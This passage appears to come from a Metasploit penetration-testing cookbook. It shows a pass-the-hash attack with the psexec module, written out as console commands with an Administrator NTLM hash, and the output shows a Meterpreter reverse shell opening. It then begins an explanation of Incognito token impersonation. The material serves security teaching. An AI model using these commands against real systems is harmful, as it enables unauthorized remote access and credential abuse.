# How to do it...

To perform a pass the hash attack, we can use the Microsoft Windows Authenticated User Code Execution exploit module and use the previous capture hash instead of the plaintext password:

```
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.216.10
RH0ST => 192.168.216.10
msf exploit(psexec) > set SMBUser Administrator
SMBUser => Administrator
msf exploit(psexec) > set SMBPASS
aad3b435b51404eea ad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
SMBPASS => aad3b435b51404eea ad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
msf exploit(psexec) > exploit
...
[*] Sending stage (179267 bytes) to 192.168.216.10
[*] Meterpreter session 1 opened (192.168.216.5:4444 -> 192.168.216.10:49293) at 2017-11-25 13:06:23 -0500

meterpreter >
```

As we can see from the output, the module is able to use the administrator username and password hash to execute an arbitrary payload.

# Incognito attacks with Meterpreter

Incognito allows us to impersonate user tokens. It was first integrated into Metasploit first, then to Meterpreter. In this recipe, we will be covering Incognito and use cases.

![](bbox=[0.14, 0.75, 0.22, 0.82])

Tokens are similar to web cookies. They are also similar to temporary keys, which allow us to enter the system and network without having to provide authentication details each time. Incognito exploits this by replaying that temporary key when asked to authenticate.
There are two types of tokens: delegate and impersonate. delegate tokens are for interactive logins, whereas impersonate tokens are for noninteractive sessions.